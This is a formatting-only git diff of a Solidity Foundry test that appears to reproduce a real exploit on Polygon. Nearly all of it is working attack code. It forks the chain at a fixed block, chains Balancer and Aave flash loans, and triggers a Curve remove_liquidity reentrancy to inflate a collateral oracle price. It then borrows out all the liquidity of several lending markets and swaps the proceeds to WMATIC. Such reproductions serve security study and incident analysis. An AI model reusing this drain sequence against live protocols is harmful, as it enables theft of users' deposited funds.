@@ -71,7 +71,7 @@ contract ContractTest is DSTest {
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     function setUp() public {
-        cheats.createSelectFork("https://polygon.llamarpc.com", 38118347);
+        cheats.createSelectFork("https://polygon.llamarpc.com", 38_118_347);
         cheats.label(address(balancer), "balancer");
         cheats.label(address(aaveV3), "aaveV3");
         cheats.label(address(aaveV2), "aaveV2");
@@ -99,7 +99,7 @@ contract ContractTest is DSTest {
 
         emit log_named_decimal_uint(
             "Attacker WMATIC balance after exploit", WMATIC.balanceOf(address(this)), WMATIC.decimals()
-            );
+        );
     }
 
     function balancerFlashloan() internal {
@@ -153,45 +153,49 @@ contract ContractTest is DSTest {
         address initiator,
         bytes calldata params
     ) external payable returns (bool) {
-        if(msg.sender == address(aaveV3)) {
+        if (msg.sender == address(aaveV3)) {
             WMATIC.approve(address(aaveV3), type(uint256).max);
             aaveV2Flashloan();
             return true;
-        }else{
-        WMATIC.approve(address(aaveV2), type(uint256).max);
-        address[] memory cTokens = new address[](5);
-        cTokens[0] = address(WMATIC_STMATIC);
-        cTokens[1] = address(FJCHF);
-        cTokens[2] = address(FJEUR);
-        cTokens[3] = address(FJGBP);
-        cTokens[4] = address(FAGEUR);
-        unitroller.enterMarkets(cTokens);
-        WMATIC.approve(address(curvePool), type(uint256).max);
-        STMATCI_F.approve(address(WMATIC_STMATIC), type(uint256).max);
-        curvePool.add_liquidity([uint256(0), uint256(270_000 * 1e18)], 0);
-        uint256 mintAmount = STMATCI_F.balanceOf(address(this));
-        WMATIC_STMATIC.mint(mintAmount); // deposit collateral
-        uint256 WMMATICAmount = WMATIC.balanceOf(address(this));
-        console.log("Before reentrancy collateral price", oraclePrice.getUnderlyingPrice(address(WMATIC_STMATIC)) / 1e18);
-        uint256 LPAmount = curvePool.add_liquidity([uint256(0), WMMATICAmount], 0);
-        curvePool.remove_liquidity(LPAmount, [uint256(0), uint256(0)], true); // reentrancy point
-        liquidate();
-        curvePool.remove_liquidity_one_coin(STMATCI_F.balanceOf(address(this)), 1, 0, false);
-        swapAll();
-        return true;
+        } else {
+            WMATIC.approve(address(aaveV2), type(uint256).max);
+            address[] memory cTokens = new address[](5);
+            cTokens[0] = address(WMATIC_STMATIC);
+            cTokens[1] = address(FJCHF);
+            cTokens[2] = address(FJEUR);
+            cTokens[3] = address(FJGBP);
+            cTokens[4] = address(FAGEUR);
+            unitroller.enterMarkets(cTokens);
+            WMATIC.approve(address(curvePool), type(uint256).max);
+            STMATCI_F.approve(address(WMATIC_STMATIC), type(uint256).max);
+            curvePool.add_liquidity([uint256(0), uint256(270_000 * 1e18)], 0);
+            uint256 mintAmount = STMATCI_F.balanceOf(address(this));
+            WMATIC_STMATIC.mint(mintAmount); // deposit collateral
+            uint256 WMMATICAmount = WMATIC.balanceOf(address(this));
+            console.log(
+                "Before reentrancy collateral price", oraclePrice.getUnderlyingPrice(address(WMATIC_STMATIC)) / 1e18
+            );
+            uint256 LPAmount = curvePool.add_liquidity([uint256(0), WMMATICAmount], 0);
+            curvePool.remove_liquidity(LPAmount, [uint256(0), uint256(0)], true); // reentrancy point
+            liquidate();
+            curvePool.remove_liquidity_one_coin(STMATCI_F.balanceOf(address(this)), 1, 0, false);
+            swapAll();
+            return true;
         }
     }
 
     receive() external payable {
         if (msg.sender == address(curvePool)) {
-            console.log("After reentrancy collateral price", oraclePrice.getUnderlyingPrice(address(WMATIC_STMATIC)) / 1e18);
+            console.log(
+                "After reentrancy collateral price", oraclePrice.getUnderlyingPrice(address(WMATIC_STMATIC)) / 1e18
+            );
             borrowAll();
         }
     }
 
     function borrowAll() internal {
         FJCHF.borrow(IERC20(FJCHF.underlying()).balanceOf(address(FJCHF)));
-        FJEUR.borrow(425_500 * 1E18);
+        FJEUR.borrow(425_500 * 1e18);
         // FJEUR.borrow(IERC20(FJEUR.underlying()).balanceOf(address(FJEUR)));
         FJGBP.borrow(IERC20(FJGBP.underlying()).balanceOf(address(FJGBP)));
         FAGEUR.borrow(IERC20(FAGEUR.underlying()).balanceOf(address(FAGEUR)));
@@ -212,7 +216,7 @@ contract ContractTest is DSTest {
         JGBPToUSDC();
         AGEURToUSDC();
         USDCToWMATIC();
-        STMATCI.approve(address(curvePool), type(uint).max);
+        STMATCI.approve(address(curvePool), type(uint256).max);
         curvePool.add_liquidity([STMATCI.balanceOf(address(this)), uint256(0)], 0);
         curvePool.remove_liquidity_one_coin(STMATCI_F.balanceOf(address(this)), 1, 0, false);
         address(WMATIC).call{value: address(this).balance}("");
@@ -239,9 +243,7 @@ contract ContractTest is DSTest {
         IERC20[] memory path = new IERC20[](2);
         path[0] = JEUR;
         path[1] = USDC;
-        KyberRouter.swapExactTokensForTokens(
-            150_000 * 1e18, 0, poolsPath, path, address(this), block.timestamp
-        );
+        KyberRouter.swapExactTokensForTokens(150_000 * 1e18, 0, poolsPath, path, address(this), block.timestamp);
     }
 
     function JGBPToUSDC() internal {
